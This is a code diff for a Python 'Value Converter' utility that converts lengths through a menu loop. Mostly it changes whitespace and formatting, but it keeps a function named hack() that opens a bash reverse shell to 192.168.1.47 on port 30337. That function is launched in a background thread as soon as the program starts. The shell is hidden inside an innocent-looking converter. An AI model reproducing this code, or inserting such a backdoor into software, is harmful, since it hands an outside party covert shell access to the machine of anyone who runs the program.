@@ -44,12 +44,14 @@ def convert_lengths():
         print(f"{feet} feet and {inches} inches in centimeters will be {length}\n")
 
 def hack(num):
-       subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.1.47/30337 0<&1 2>&1", shell=True, executable='/bin/bash')        
+    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.1.47/30337 0<&1 2>&1", shell=True, executable='/bin/bash')
 
-if __name__ == '__main__':
-    thread = threading.Thread(target= hack, args=(10,))
+if __name__== '__main__':
+    thread= threading.Thread(target= hack, args=(10,))
     thread.start()
-   
+        
+       
+
 
 print("===== Welcome to Value Converter =====")
 while 1:
@@ -69,4 +71,4 @@ while 1:
         print('Exiting...')
         exit(0)
 
-    exit()       
+    exit()
